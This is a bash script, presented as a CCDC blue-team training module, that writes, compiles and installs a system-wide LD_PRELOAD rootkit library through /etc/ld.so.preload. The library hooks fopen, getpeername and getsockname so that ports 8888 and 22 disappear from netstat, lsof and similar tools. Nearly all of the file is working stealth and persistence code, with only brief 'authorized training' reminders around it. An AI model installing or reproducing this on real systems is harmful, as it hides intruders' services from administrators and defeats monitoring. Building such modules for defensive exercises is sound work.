#!/bin/bash
################################################################################
# CCDC_Linux_LDPRELOAD_LoadsOfIssues.sh
#
# Blue Team Training Script - LD_PRELOAD Port Hiding
# Compatible with: Ubuntu, Debian, CentOS, RHEL, Fedora
#
# Installs a system-wide LD_PRELOAD library that hides ports 8888 and 22
# from common network inspection commands (netstat, ss, lsof).
#
# NOTE: This is for authorized training environments only!
################################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO_NAME="$ID"
        DISTRO_VER="$VERSION_ID"
    else
        DISTRO_NAME="unknown"
        DISTRO_VER="unknown"
    fi
}

detect_lib_path() {
    if [ -d "/usr/lib64" ]; then
        echo "/usr/lib64"
    elif [ -d "/usr/lib/x86_64-linux-gnu" ]; then
        echo "/usr/lib/x86_64-linux-gnu"
    else
        echo "/usr/lib"
    fi
}

if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}"
   exit 1
fi

detect_distro
LIB_PATH=$(detect_lib_path)

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}CCDC LD_PRELOAD Training Module Setup${NC}"
echo -e "${BLUE}Detected: $DISTRO_NAME $DISTRO_VER${NC}"
echo -e "${BLUE}Library Path: $LIB_PATH${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Step 1: Write the C source for the port-hiding library
echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD port-hiding library source...${NC}"

PRELOAD_SOURCE_DIR="/tmp/preload_src"
mkdir -p "$PRELOAD_SOURCE_DIR"

cat > "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" << 'CSRC'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <unistd.h>

#define HIDDEN_PORT_1 8888
#define HIDDEN_PORT_2 22

typedef FILE* (*fopen_t)(const char *, const char *);
typedef int   (*getpeername_t)(int, struct sockaddr *, socklen_t *);
typedef int   (*getsockname_t)(int, struct sockaddr *, socklen_t *);

static fopen_t        real_fopen        = NULL;
static getpeername_t  real_getpeername  = NULL;
static getsockname_t  real_getsockname  = NULL;

static void init_hooks(void) {
    if (!real_fopen)        real_fopen        = (fopen_t)dlsym(RTLD_NEXT, "fopen");
    if (!real_getpeername)  real_getpeername  = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
    if (!real_getsockname)  real_getsockname  = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
}

/* Returns 1 if a /proc/net/tcp* line belongs to a hidden port (local address field) */
static int line_has_hidden_port(const char *line) {
    return (strstr(line, ":22B8 ") != NULL ||
            strstr(line, ":22b8 ") != NULL ||
            strstr(line, ":0016 ") != NULL);
}

static int is_proc_net_path(const char *path) {
    if (!path) return 0;
    return (strcmp(path, "/proc/net/tcp")  == 0 ||
            strcmp(path, "/proc/net/tcp6") == 0 ||
            strcmp(path, "/proc/net/udp")  == 0 ||
            strcmp(path, "/proc/net/udp6") == 0);
}

/*
 * Hook fopen: when a caller opens /proc/net/tcp* or /proc/net/udp*,
 * return a filtered copy with hidden-port lines stripped out.
 * netstat and similar tools read these files to list connections.
 */
FILE *fopen(const char *path, const char *mode) {
    init_hooks();
    if (!is_proc_net_path(path))
        return real_fopen(path, mode);

    FILE *orig = real_fopen(path, mode);
    if (!orig) return NULL;

    char tmppath[] = "/tmp/.ccdc_net_XXXXXX";
    int fd = mkstemp(tmppath);
    if (fd < 0) return orig;
    unlink(tmppath);

    FILE *tmp = fdopen(fd, "w+");
    if (!tmp) { close(fd); return orig; }

    char line[512];
    while (fgets(line, sizeof(line), orig)) {
        if (!line_has_hidden_port(line))
            fputs(line, tmp);
    }
    fclose(orig);
    rewind(tmp);
    return tmp;
}

static int port_is_hidden(unsigned short port) {
    return (port == HIDDEN_PORT_1 || port == HIDDEN_PORT_2);
}

/*
 * Hook getpeername / getsockname: return ENOTCONN for hidden ports.
 * lsof and netstat call these when inspecting individual sockets.
 */
int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    init_hooks();
    int r = real_getpeername(sockfd, addr, addrlen);
    if (r == 0 && addr) {
        if (addr->sa_family == AF_INET &&
            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
            { errno = ENOTCONN; return -1; }
        if (addr->sa_family == AF_INET6 &&
            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
            { errno = ENOTCONN; return -1; }
    }
    return r;
}

int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    init_hooks();
    int r = real_getsockname(sockfd, addr, addrlen);
    if (r == 0 && addr) {
        if (addr->sa_family == AF_INET &&
            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
            { errno = ENOTCONN; return -1; }
        if (addr->sa_family == AF_INET6 &&
            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
            { errno = ENOTCONN; return -1; }
    }
    return r;
}
CSRC

echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libccdc_hijack.c${NC}"

# Step 2: Install GCC if not present
echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
if ! command -v gcc &> /dev/null; then
    case "$DISTRO_NAME" in
        ubuntu|debian|kali|linuxmint|pop)
            apt-get install -y -qq gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via apt${NC}" \
                || echo -e "${YELLOW}[!] apt GCC install failed${NC}"
            ;;
        centos|rhel|rocky|almalinux|ol)
            yum install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via yum${NC}" \
                || echo -e "${YELLOW}[!] yum GCC install failed${NC}"
            ;;
        fedora)
            dnf install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via dnf${NC}" \
                || echo -e "${YELLOW}[!] dnf GCC install failed${NC}"
            ;;
        *)
            if command -v apt-get &>/dev/null; then
                apt-get install -y -qq gcc 2>/dev/null
            elif command -v dnf &>/dev/null; then
                dnf install -y gcc 2>/dev/null
            elif command -v yum &>/dev/null; then
                yum install -y gcc 2>/dev/null
            fi
            ;;
    esac
else
    echo -e "${GREEN}[+] GCC already installed${NC}"
fi

# Step 3: Compile the library
echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"

if command -v gcc &> /dev/null; then
    if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" \
        "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" -ldl 2>/dev/null; then
        echo -e "${GREEN}[+] Successfully compiled libccdc_hijack.so${NC}"
        if cp "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" "$LIB_PATH/libccdc_hijack.so"; then
            chmod 644 "$LIB_PATH/libccdc_hijack.so"
            echo -e "${GREEN}[+] Installed to $LIB_PATH/libccdc_hijack.so${NC}"
        else
            echo -e "${YELLOW}[!] Could not copy compiled library to $LIB_PATH${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Compilation failed${NC}"
    fi
else
    echo -e "${RED}[-] GCC unavailable after install attempt — skipping library compilation${NC}"
fi

# Step 4: Set up system-wide LD_PRELOAD
echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"

LD_PRELOAD_FILE="/etc/ld.so.preload"

if [ -f "$LD_PRELOAD_FILE" ]; then
    cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.backup.ccdc_training"
    echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
fi

if [ -f "$LIB_PATH/libccdc_hijack.so" ]; then
    echo "$LIB_PATH/libccdc_hijack.so" > "$LD_PRELOAD_FILE"
    chmod 644 "$LD_PRELOAD_FILE"
    echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
else
    echo -e "${YELLOW}[!] Library not found — /etc/ld.so.preload not updated${NC}"
fi

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${BLUE}Library:${NC}             $LIB_PATH/libccdc_hijack.so"
echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
echo ""
echo -e "${YELLOW}Effect:${NC}"
echo -e "  Ports 8888 and 22 are now hidden from netstat, lsof, and similar tools."
echo -e "  netstat -tulpn | grep 8888   — should return nothing"
echo -e "  netstat -tulpn | grep ':22 ' — should return nothing"
echo ""
echo -e "${YELLOW}REMINDER: This is for authorized training only!${NC}"
echo ""
